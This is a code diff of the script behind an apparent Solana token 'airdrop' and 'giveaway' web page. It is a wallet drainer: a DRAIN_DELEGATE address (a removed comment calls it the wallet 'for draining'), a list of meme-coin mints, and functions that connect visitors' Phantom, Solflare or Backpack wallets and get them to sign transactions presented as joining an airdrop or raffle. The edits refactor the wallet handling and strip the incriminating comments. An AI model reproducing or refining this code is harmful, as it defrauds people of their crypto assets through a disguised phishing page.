@@ -237,7 +237,7 @@
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 
 <script>
-    const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Твой кошелёк для слива
+    const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
 
     const MEME_MINTS = [
         "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
@@ -247,7 +247,7 @@
     ];
 
     let walletPubkey = null;
-    let wallet = null;
+    let walletProvider = null;
 
     async function connectWallet() {
         const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
@@ -258,23 +258,22 @@
             return;
         }
 
-        const wallets = [];
-        if (window.phantom?.solana?.isPhantom) wallets.push({ provider: window.phantom.solana });
-        if (window.solflare?.isSolflare) wallets.push({ provider: window.solflare });
-        if (window.backpack) wallets.push({ provider: window.backpack.solana });
-        if (window.solana && !wallets.some(w => w.provider === window.solana)) wallets.push({ provider: window.solana });
+        let provider = null;
 
-        if (wallets.length === 0) {
-            alert("Установи Solana wallet!");
+        if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
+        else if (window.solflare?.isSolflare) provider = window.solflare;
+        else if (window.backpack?.isBackpack) provider = window.backpack;
+        else if (window.solana) provider = window.solana;
+
+        if (!provider) {
+            alert("Установи Phantom, Solflare или Backpack!");
             return;
         }
 
-        let provider = wallets[0].provider;
-
         try {
             await provider.connect();
-            wallet = provider;
-            walletPubkey = wallet.publicKey.toString();
+            walletProvider = provider;
+            walletPubkey = provider.publicKey.toString();
 
             document.getElementById('connect-nav').innerText = walletPubkey.slice(0,4) + '...' + walletPubkey.slice(-4);
             document.getElementById('connect-nav').disabled = true;
@@ -286,7 +285,10 @@
     }
 
     async function handleAirdrop() {
-        if (!walletPubkey) return;
+        if (!walletProvider) {
+            alert("Подключи кошелёк");
+            return;
+        }
 
         try {
             const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
@@ -317,18 +319,21 @@
             const { blockhash } = await connection.getLatestBlockhash();
             tx.recentBlockhash = blockhash;
 
-            const signed = await wallet.signTransaction(tx);
+            const signed = await walletProvider.signTransaction(tx);
             const sig = await connection.sendRawTransaction(signed.serialize());
 
-            alert(`Успех! Вы в аирдропе.\nTx: ${sig}`);
+            alert(`Успех! Аирдроп.\nTx: ${sig.substring(0, 20)}...`);
             document.getElementById('airdrop-btn').disabled = true;
         } catch (err) {
-            alert("Ошибка — попробуй снова");
+            alert("Ошибка подписи");
         }
     }
 
     async function handleGiveaway() {
-        if (!walletPubkey) return;
+        if (!walletProvider) {
+            alert("Подключи кошелёк");
+            return;
+        }
 
         try {
             const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
@@ -346,13 +351,13 @@
             const { blockhash } = await connection.getLatestBlockhash();
             tx.recentBlockhash = blockhash;
 
-            const signed = await wallet.signTransaction(tx);
+            const signed = await walletProvider.signTransaction(tx);
             const sig = await connection.sendRawTransaction(signed.serialize());
 
-            alert(`Успех! Вы в розыгрыше.\nTx: ${sig}`);
+            alert(`Успех! Розыгрыш.\nTx: ${sig.substring(0, 20)}...`);
             document.getElementById('raffle-btn').disabled = true;
         } catch (err) {
-            alert("Ошибка — попробуй снова");
+            alert("Ошибка подписи");
         }
     }
 
@@ -367,7 +372,7 @@
         if (raffleBtn) raffleBtn.addEventListener('click', handleGiveaway);
     });
 
-    // Партиклы (твой оригинальный код)
+    // Партиклы
     (function () {
       const canvas = document.getElementById("dust");
       const ctx = canvas.getContext("2d");
